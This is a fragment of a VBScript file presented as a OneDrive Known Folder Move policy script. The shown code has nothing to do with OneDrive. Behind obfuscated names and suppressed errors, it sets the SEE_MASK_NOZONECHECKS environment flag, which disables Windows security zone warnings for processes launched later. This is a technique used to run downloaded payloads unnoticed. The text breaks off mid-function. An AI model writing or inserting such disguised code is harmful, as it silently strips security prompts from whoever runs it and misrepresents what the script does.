' --- OneDrive KFM policy touch ---
Function UnpackSyncDelta40()
On Error Resume Next
  Dim strPath75,strPolicyBlock486,strQueue6
  Set strPath75=CreateObject("WScript.Shell")
  strPolicyBlock486=strPath75.ExpandEnvironmentStrings("%TEMP%")
  strQueue6=strPath75.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strPolicyBlock486)>0 And Len(strQueue6)>0 Then
    strPath75.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
